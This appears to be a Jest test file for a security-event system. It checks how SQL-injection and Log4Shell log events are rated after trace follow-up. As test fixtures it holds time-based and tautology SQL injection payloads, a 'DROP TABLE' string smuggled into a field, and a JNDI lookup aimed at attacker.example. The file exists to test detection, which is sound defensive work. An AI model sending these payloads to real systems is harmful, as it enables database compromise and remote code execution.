import { describe, expect, test } from "@jest/globals";
import NormalizedSecurityEvent from "../../../Types/SecurityEvent/NormalizedSecurityEvent";
import OcsfSeverity from "../../../Types/SecurityEvent/OcsfSeverity";
import SecurityEventRequestOutcome, {
  SECURITY_REQUEST_ATTRIBUTES,
} from "../../../Types/SecurityEvent/SecurityEventRequestOutcome";
import WebAttackLogParser from "../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
import { applyRequestAssessment } from "../../../Utils/SecurityEvent/RequestFollowUp";
import { RequestTraceAssessment } from "../../../Utils/SecurityEvent/RequestOutcome";
import { WEB_LINES, logLine } from "./LogParsers/LogParserFixtures";

/*
 * What following a request writes onto its event: the facts the trace
 * adds, the typed columns the line left empty, and - for a web attack - a
 * severity and a message that follow how far it got.
 */

const APPLICATION_ERROR: string = JSON.stringify({
  name: "Error",
  message:
    "Page not found - /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)",
  stack:
    "Error: Page not found - /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)\n    at /usr/src/Common/Server/Utils/StartServer.ts:560:7",
});

function eventFrom(body: string): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = WebAttackLogParser.parse({
    ...logLine(body),
    traceId: "4bf92f3577b34da6a3ce929d0e0e4736",
    spanId: "00f067aa0ba902b7",
  });

  expect(events).toHaveLength(1);

  return events[0]!;
}

function assessment(
  overrides: Partial<RequestTraceAssessment> = {},
): RequestTraceAssessment {
  return {
    outcome: SecurityEventRequestOutcome.Rejected,
    serverSpanId: "aaaaaaaaaaaaaaaa",
    statusCode: 404,
    method: "get",
    url: "https://oneuptime.com/sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)",
    route: "",
    clientAddress: "198.51.100.23",
    userAgent: "Mozilla/5.0 (compatible; scanner)",
    userId: "",
    durationMs: 3.4,
    exception: undefined,
    database: undefined,
    requestedDelaySeconds: 0,
    ...overrides,
  };
}

describe("applyRequestAssessment", () => {
  test("a probe the app turned away is Low, says the answer, and names who sent it", () => {
    const event: NormalizedSecurityEvent = eventFrom(APPLICATION_ERROR);

    // As the line alone said it: no answer, no client, Medium.
    expect(event.severityName).toBe(OcsfSeverity.Medium);
    expect(event.principalIp).toBe("");
    expect(event.message).toBe(
      "SQL injection attempt: /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)",
    );

    applyRequestAssessment(event, assessment());

    expect(event.requestOutcome).toBe(SecurityEventRequestOutcome.Rejected);
    expect(event.severityName).toBe(OcsfSeverity.Low);
    expect(event.severityId).toBe(2);
    expect(event.message).toBe(
      "SQL injection attempt: GET /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356) → 404",
    );
    expect(event.principalIp).toBe("198.51.100.23");
    expect(event.observables).toContain("198.51.100.23");
    expect(event.activityName).toBe("GET");
    expect(event.statusName).toBe("Failure");
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.method]).toBe("GET");
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.statusCode]).toBe(
      "404",
    );
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.clientAddress]).toBe(
      "198.51.100.23",
    );
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.userAgent]).toBe(
      "Mozilla/5.0 (compatible; scanner)",
    );
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.durationMs]).toBe("3");
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.serverSpanId]).toBe(
      "aaaaaaaaaaaaaaaa",
    );
  });

  test("an injection that reached the database is Critical, and keeps the query as evidence", () => {
    const event: NormalizedSecurityEvent = eventFrom(APPLICATION_ERROR);

    applyRequestAssessment(
      event,
      assessment({
        outcome: SecurityEventRequestOutcome.ReachedDatabase,
        statusCode: 200,
        durationMs: 16_031,
        requestedDelaySeconds: 16,
        database: {
          system: "mysql",
          statement:
            "SELECT * FROM pages WHERE offset = 1;SELECT IF((SLEEP(16)),1,2356)",
          durationMs: 16_002,
        },
      }),
    );

    expect(event.requestOutcome).toBe(
      SecurityEventRequestOutcome.ReachedDatabase,
    );
    expect(event.severityName).toBe(OcsfSeverity.Critical);
    expect(event.statusName).toBe("Success");
    expect(
      event.attributes[SECURITY_REQUEST_ATTRIBUTES.databaseStatement],
    ).toContain("SLEEP(16)");
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.databaseSystem]).toBe(
      "mysql",
    );
    expect(
      event.attributes[SECURITY_REQUEST_ATTRIBUTES.databaseDurationMs],
    ).toBe("16002");
    expect(
      event.attributes[SECURITY_REQUEST_ATTRIBUTES.requestedDelaySeconds],
    ).toBe("16");
  });

  test("an attack that broke something is High, and names the exception it threw", () => {
    const event: NormalizedSecurityEvent = eventFrom(APPLICATION_ERROR);

    applyRequestAssessment(
      event,
      assessment({
        outcome: SecurityEventRequestOutcome.Errored,
        statusCode: 500,
        exception: {
          spanId: "aaaaaaaaaaaaaaaa",
          fingerprint: "fp-123",
          exceptionType: "QueryFailedError",
          message: "x".repeat(2000),
        },
      }),
    );

    expect(event.severityName).toBe(OcsfSeverity.High);
    expect(
      event.attributes[SECURITY_REQUEST_ATTRIBUTES.exceptionFingerprint],
    ).toBe("fp-123");
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.exceptionType]).toBe(
      "QueryFailedError",
    );
    expect(
      String(event.attributes[SECURITY_REQUEST_ATTRIBUTES.exceptionMessage])
        .length,
    ).toBe(500);
  });

  test("a trace never makes an outcome less serious than the line already said", () => {
    // An access log line that answered 500 errored, whatever the trace adds.
    const event: NormalizedSecurityEvent = eventFrom(
      '203.0.113.40 - - [19/Oct/2026:10:00:00 +0000] "GET /item?id=1%27%20or%201%3D1 HTTP/1.1" 500 12 "-" "sqlmap"',
    );

    expect(event.requestOutcome).toBe(SecurityEventRequestOutcome.Errored);

    applyRequestAssessment(
      event,
      assessment({ outcome: SecurityEventRequestOutcome.Rejected }),
    );

    expect(event.requestOutcome).toBe(SecurityEventRequestOutcome.Errored);
    expect(event.severityName).toBe(OcsfSeverity.High);
  });

  test("what the line already said stands: its client, its status, its method", () => {
    const event: NormalizedSecurityEvent = eventFrom(
      WEB_LINES.sqlInjectionEncoded,
    );

    applyRequestAssessment(
      event,
      assessment({
        clientAddress: "10.0.0.5",
        method: "POST",
        statusCode: 404,
        outcome: SecurityEventRequestOutcome.ReachedApp,
      }),
    );

    expect(event.principalIp).toBe("203.0.113.40");
    expect(event.activityName).toBe("GET");
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.statusCode]).toBe(
      "200",
    );
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.method]).toBe("GET");
    expect(event.message).toBe(
      "SQL injection attempt: GET /item?id=1%27%20or%201%3D1 → 200",
    );
  });

  test("the user the request was signed in as becomes the event's user", () => {
    const event: NormalizedSecurityEvent = eventFrom(APPLICATION_ERROR);

    applyRequestAssessment(event, assessment({ userId: "user-42" }));

    expect(event.principalUser).toBe("user-42");
    expect(event.observables).toContain("user-42");
    expect(event.attributes[SECURITY_REQUEST_ATTRIBUTES.userId]).toBe(
      "user-42",
    );
  });

  test("a client address that is not an address is not taken", () => {
    const event: NormalizedSecurityEvent = eventFrom(APPLICATION_ERROR);

    applyRequestAssessment(
      event,
      assessment({ clientAddress: "not-an-ip; DROP TABLE" }),
    );

    expect(event.principalIp).toBe("");
    expect(
      event.attributes[SECURITY_REQUEST_ATTRIBUTES.clientAddress],
    ).toBeUndefined();
  });

  test("a Log4Shell lookup stays High when it was turned away: the logger is the exploit", () => {
    const event: NormalizedSecurityEvent = eventFrom(
      WEB_LINES.log4ShellInUserAgent,
    );

    applyRequestAssessment(
      event,
      assessment({ outcome: SecurityEventRequestOutcome.Rejected }),
    );

    expect(event.severityName).toBe(OcsfSeverity.High);
    // The lookup was in a header, so the message still says it.
    expect(event.message).toContain("${jndi:ldap://attacker.example/a}");
  });

  test("an event that is not a web attack keeps its message and severity", () => {
    const event: NormalizedSecurityEvent = {
      ...eventFrom(APPLICATION_ERROR),
      message: "Failed password for root from 203.0.113.9",
      severityName: OcsfSeverity.Medium,
      severityId: 3,
      attributes: {},
    };

    applyRequestAssessment(
      event,
      assessment({ outcome: SecurityEventRequestOutcome.ReachedApp }),
    );

    expect(event.message).toBe("Failed password for root from 203.0.113.9");
    expect(event.severityName).toBe(OcsfSeverity.Medium);
    expect(event.requestOutcome).toBe(SecurityEventRequestOutcome.ReachedApp);
  });

  test("a request with no answer leaves the outcome the line gave it", () => {
    const event: NormalizedSecurityEvent = eventFrom(APPLICATION_ERROR);

    applyRequestAssessment(
      event,
      assessment({ outcome: undefined, statusCode: 0, method: "" }),
    );

    expect(event.requestOutcome).toBeUndefined();
    expect(event.severityName).toBe(OcsfSeverity.Medium);
    expect(event.statusName).toBe("");
  });
});
